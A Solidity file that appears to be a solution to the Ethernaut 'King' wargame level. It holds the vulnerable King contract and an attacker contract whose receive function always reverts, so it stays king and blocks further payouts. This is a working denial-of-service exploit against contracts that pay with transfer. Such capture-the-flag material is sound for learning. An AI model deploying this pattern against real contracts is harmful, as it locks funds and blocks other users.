// SPDX-License-Identifier: MIT
pragma solidity ^0.8.7;

contract King {

  address payable king;
  uint public prize;
  address payable public owner;

  constructor() public payable {
    owner = payable(msg.sender);  
    king = payable(msg.sender);
    prize = msg.value;
  }

  receive() external payable {
    require(msg.value >= prize || msg.sender == owner);
    king.transfer(msg.value);
    king = payable(msg.sender);
    prize = msg.value;
  }

  function _king() public view returns (address payable) {
    return king;
  }
}

//0x557d634258B353BAC0F7d17d807DAAE74851F638

contract ethernautKing {

    function solve() external payable {
        address payable contractAddr = payable(0x557d634258B353BAC0F7d17d807DAAE74851F638);
        contractAddr.send(msg.value); //1000000000000001
    }

    receive() external payable {
        revert();
    }
}
